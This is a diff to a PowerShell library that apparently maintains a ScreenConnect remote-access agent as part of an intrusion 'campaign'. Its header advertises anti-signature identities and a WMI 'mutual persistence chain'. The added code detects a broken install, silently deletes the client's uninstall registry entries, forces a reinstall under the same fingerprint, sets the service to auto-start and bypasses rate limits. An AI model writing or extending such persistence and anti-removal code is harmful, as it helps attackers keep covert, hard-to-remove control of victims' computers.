@@ -1,8 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L20
+# OWN_LIB  BUILD 20260802L21
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
+# L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
 # L18: exterminate was KILLING Gryxa (null-path proc kill); sync FP before kill.
@@ -569,6 +570,19 @@ function Uninstall-ScFingerprint([string]$Fingerprint) {
         & sc.exe delete $name 2>&1 | Out-Null
         Start-Sleep -Seconds 2
     }
+    # O45: clear stale ARP key so same-FP msiexec /i can re-register (fix stuck "registered, no svc/dir")
+    foreach ($r in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+                     'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')) {
+        if ($guid -and (Test-Path "$r\$guid")) {
+            Remove-Item -LiteralPath "$r\$guid" -Recurse -Force -ErrorAction SilentlyContinue
+        }
+        Get-ChildItem $r -ErrorAction SilentlyContinue | ForEach-Object {
+            $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
+            if ($dn -match "ScreenConnect Client \($([regex]::Escape($Fingerprint))\)") {
+                Remove-Item -LiteralPath $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue
+            }
+        }
+    }
     foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
         $d = Join-Path $base "ScreenConnect Client ($Fingerprint)"
         if (Test-Path -LiteralPath $d) {
@@ -663,7 +677,24 @@ function Invoke-GryxaEnsure {
             return "HEALTHY|$fpTry|started=1"
         }
     }
-    if (Find-ProductGuid $fpTry) {
+    # O45: STUCK — registered but no service and no dir = broken msiexec. /fa repair,
+    # and if still missing nuke ARP so same-FP /i re-registers. Bypass rate-limit.
+    if ((Find-ProductGuid $fpTry) -and -not $svc -and -not (Test-ScDir $fpTry)) {
+        GLog 'stuck_registered_repair_fa'
+        $null = Repair-SCService $fpTry
+        Start-Sleep -Seconds 5
+        & sc.exe config $name start= auto 2>&1 | Out-Null
+        & sc.exe start $name 2>&1 | Out-Null
+        Start-Sleep -Seconds 5
+        if (Test-ScRunning $fpTry) {
+            Set-GryxaFp $fpTry
+            GLog 'stuck_fa_started_ok'
+            return "HEALTHY|$fpTry|fa-started=1"
+        }
+        GLog 'stuck_arp_nuke_then_reinstall'
+        $null = Uninstall-ScFingerprint $fpTry
+        Remove-Item -LiteralPath (Join-Path $WorkDir 'gryxa_reinstall.flag') -Force -ErrorAction SilentlyContinue
+    } elseif (Find-ProductGuid $fpTry) {
         GLog 'light_repair_attempt'
         $null = Repair-SCService $fpTry
         Start-Sleep -Seconds 4
@@ -1087,5 +1118,5 @@ switch ($Action) {
     'registered'      { Test-SCRegistered $Fp }
     'exterminate'     { Invoke-Exterminate }
     'gryxa-health'    { Test-GryxaHealth }
-    'gryxa-ensure'    { Invoke-GryxaEnsure }
+    'gryxa-ensure'    { Write-Output (Invoke-GryxaEnsure | Out-String).Trim() }
 }
